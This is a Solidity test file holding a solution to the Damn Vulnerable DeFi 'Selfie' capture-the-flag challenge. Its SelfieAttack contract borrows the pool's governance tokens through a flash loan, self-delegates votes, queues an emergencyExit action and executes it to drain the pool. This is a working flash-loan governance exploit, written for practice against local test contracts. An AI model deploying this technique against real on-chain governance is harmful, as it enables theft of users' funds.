// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        SelfieAttack attack = new SelfieAttack(
            recovery,
            address(pool),
            address(governance),
            address(token)
        );
        attack.attack();
        // The attack contract will take a flash loan, delegate the voting power to itself,
        // queue an action to emergency exit the pool, and execute it after the delay.
        // The action will transfer all tokens from the pool to the recovery address.
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(
            token.balanceOf(recovery),
            TOKENS_IN_POOL,
            "Not enough tokens in recovery account"
        );
    }
}

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttack is IERC3156FlashBorrower, Test {
    address public player;
    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableVotes public token;
    uint public actionId;
    bytes32 private constant CALLBACK_SUCCESS =
        keccak256("ERC3156FlashBorrower.onFlashLoan");

    constructor(
        address _player,
        address _pool,
        address _governance,
        address _token
    ) {
        pool = SelfiePool(_pool);
        player = _player;
        governance = SimpleGovernance(_governance);
        token = DamnValuableVotes(_token);
    }

    function attack() external {
        SelfiePool(pool).flashLoan(
            IERC3156FlashBorrower(address(this)),
            address(token),
            SelfiePool(pool).maxFlashLoan(address(token)),
            ""
        );
        // Execute the action after the delay
        vm.warp(block.timestamp + governance.getActionDelay());
        governance.executeAction(actionId);
    }

    function onFlashLoan(
        address _initiator, //who will call this function,
        address, // address of the token,
        uint256 _amount,
        uint256 _fee,
        bytes calldata //bytes for callback function
    ) external returns (bytes32) {
        require(msg.sender == address(pool), "Only pool can call");
        require(_initiator == address(this), " Initiator is not self");

        // u can delegate the token to the pool and get the voting power
        token.delegate(address(this));
        uint _actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", player)
        );

        actionId = _actionId;
        token.approve(address(pool), _amount + _fee); //approve the pool to withdraw the tokens
        return CALLBACK_SUCCESS;
    }
}
